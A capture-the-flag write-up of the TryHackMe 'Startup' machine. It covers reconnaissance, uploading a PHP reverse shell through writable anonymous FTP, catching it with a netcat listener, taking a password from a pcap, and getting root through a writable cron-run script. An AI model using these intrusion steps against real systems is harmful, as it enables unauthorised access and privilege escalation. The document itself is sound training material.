---
title: THM Spice Hut
date: 2023-12-08T21:03:54.640Z
tags:
  - writeup
description: Writeup of TryHackMe's machine 'Startup' Aka Spice hut
---
# Initial Reconnaissance

Running an nmap service scan with default scripts on the host reveals the following

```
nmap -sV -sC 10.10.10.10
PORT   STATE SERVICE VERSION                                                                  
21/tcp open  ftp     vsftpd 3.0.3                                                             
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                        
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]                                                                                                               
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg       
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt          
| ftp-syst:                                                                   
|   STAT:                                                                     
| FTP server status:                                                          
|      Connected to 10.11.47.141                                                                                                                             
|      Logged in as ftp                                                       
|      TYPE: ASCII                                                            
|      No session bandwidth limit                                                                                                                            
|      Session timeout in seconds is 300                                      
|      Control connection is plain text                                       
|      Data connections will be plain text                                                                                                                                                   
|      At session startup, client count was 3                                 
|      vsFTPd 3.0.3 - secure, fast, stable                    
|_End of status                                                                               
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)                                                                           
| ssh-hostkey:                                                                
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)                                
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)                                                                                              
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)                                                                                            
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                                           
|_http-title: Maintenance                                                                                                                                                                    
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# Anonymous FTP

Interestingly, there is an FTP share open, with anonymous logon enabled. We can access this share and have a poke around.

```
└─$ ftp anonymous@startup.thm
Connected to startup.thm.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||14285|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
```

On the share there is a file called notice.txt, which contains the following text:

`Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.`

This files indicates file download / view functionality from the share, we can run gobuster to try and find the URL from which we can download / view files.

```
$ gobuster dir -u http://startup.thm -w /usr/share/wordlists/dirb/common.txt
..
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/files                (Status: 301) [Size: 310] [--> http://startup.thm/files/]
/index.html           (Status: 200) [Size: 808]
```

The /files URL seems promising.

# Reverse Shellin

Nmap tells us that the `ftp` directory within the FTP share is writable, meaning we can put files in there. This will allow us to upload a reverse shell. From the nmap scan we can see that the web server uses apache, so a PHP shell will probably work.

I used [this](https://github.com/pentestmonkey/php-reverse-shell) PHP shell, modified the variables to point to my machine on port 4444, uploaded the file, and started a listener. Next I navigated to `http://startup.thm/files/php-shell.php` and received a callback to my listener. Next, we stabalise our shell and after a bit of poking around, the 'secret spicy soup recipe' can be found in recipe.txt in the root directory (/).

```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.47.141] from (UNKNOWN) [10.10.144.233] 55476
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 20:50:51 up 9 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@startup:/$ cat /recipe.txt
#############################################
```

# Escaping www-data

Along with recipe.txt, in the root directory (/), there is a directory called `incidents`. Within this directory there is a PCAP file called `suspicious.pcapng`. We can copy this across to our Kali machine and open it in wireshark.

```
$ cd /incidents
$ scp suspicious.pcapng kali@10.11.47.141:/home/kali/Desktop/THM/startup/sus.pcapng
```

When the file is opened in wireshark, there is a lot of traffic. After inspection, it looks like the traffic shows another user uploaded a reverse shell (shell.php) and then tries to run commands, authenticating with a password. We can follow the TCP stream to port 4444 that the user used in order to view the commands:

![](/img/virtualboxvm_nkyfhwkzbk.png)

Within the exchange of commands, there is a snippet as follows:

```
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: c4ntg3t3n0ughsp1c3
```

This reveals the password `c4ntg3t3n0ughsp1c3`. My first thought was that maybe this person thought they were `lennie`, and this is `lennie's` password. So I tried SSHing to lennie's account on the machine and authenting with this password was successful, and we can read the user flag.

```
$ ssh lennie@startup.thm
password: c4ntg3t3n0ughsp1c3

$ cat /home/lennie/user.txt
THM{########################################}
```

# Privilege Escalation

Within `lennie's` home directory, there is another directory called `scripts`, which contains two files: `planner.sh`, and `startup_list.txt`. Lennie can not modify planner.sh, however can read it. `planner.sh` contains the following:

```
$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

After checking the permissions of `/etc/print.sh`, we can modify this. Given that root is the owner of the `planner.sh` file, maybe if we modify `/etc/print.sh` to perform some privileged command, we can write the results to our home directory. We know the flag file is `/root/root.txt`, so let's modify `/etc/print.sh` as follows:

```
$ cat /etc/print.sh
#!/bin/bash
echo "Done!"
cat /root/root.txt > /home/lennie/root.txt
```

Within a minute or so, there is a `root.txt` file in `lennie's` home directory!

```
$ cat /home/lennie/root.txt
THM{##############################################}
```